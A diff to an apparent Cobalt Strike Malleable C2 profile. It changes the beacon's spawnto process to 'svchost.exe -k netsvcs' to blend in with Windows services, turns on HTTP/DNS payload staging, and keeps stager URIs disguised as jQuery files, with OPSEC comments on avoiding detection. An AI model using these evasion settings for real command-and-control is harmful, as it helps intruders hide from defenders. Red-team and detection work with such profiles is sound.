@@ -113,16 +113,16 @@ https-certificate {
 ## Guidelines
 ##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
 ##      - sysnative for x64 and syswow64 for x86
-##      - Example x64 : C:\WINDOWS\sysnative\svchost.exe
-##        Example x86 : C:\WINDOWS\syswow64\svchost.exe
+##      - Example x64 : C:\WINDOWS\sysnative\w32tm.exe
+##        Example x86 : C:\WINDOWS\syswow64\w32tm.exe
 ##    - The binary doesnt do anything wierd (protected binary, etc)
 ##    - !! Don't use these !! 
 ##    -   "csrss.exe","logoff.exe","rdpinit.exe","bootim.exe","smss.exe","userinit.exe","sppsvc.exe"
 ##    - A binary that executes without the UAC
 ##    - 64 bit for x64
 ##    - 32 bit for x86
-set spawnto_x86 "%windir%\\syswow64\\w32tm.exe";
-set spawnto_x64 "%windir%\\sysnative\\w32tm.exe";
+set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
+set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
 
 ################################################
 ## SMB beacons
@@ -176,6 +176,9 @@ set dns_stager_subhost ".feeds.123456.";
 ## Guidelines:
 ##    - Add customize HTTP headers to the HTTP traffic of your campaign
 ##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)
+
+set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
+
 http-stager {  
     set uri_x86 "/jquery-3.3.1.slim.min.js";
     set uri_x64 "/jquery-3.3.2.slim.min.js";
